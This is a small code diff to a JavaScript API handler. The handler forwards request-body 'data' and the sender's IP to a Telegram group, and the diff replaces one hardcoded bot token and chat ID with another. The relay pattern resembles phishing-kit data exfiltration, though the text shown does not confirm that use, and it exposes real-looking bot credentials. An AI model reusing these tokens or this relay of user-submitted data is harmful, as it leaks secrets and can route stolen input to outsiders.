@@ -3,8 +3,8 @@ export default async function handler(req, res) {
     try {
       const { data, ip } = req.body;
 
-      const telegramToken = '7772207395:AAHknosB4lA-WYe8qzRjBD5lXuXZ57yGWmQ'; // Your Telegram Bot API Token
-      const chatId = '-1002327298591'; // Your Telegram Group ID
+      const telegramToken = '7551442571:AAE3sejEzFeCa4zeiAYC5B8j8_el659tbgY'; // Your Telegram Bot API Token
+      const chatId = '-1002301533810'; // Your Telegram Group ID
 
       const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
 
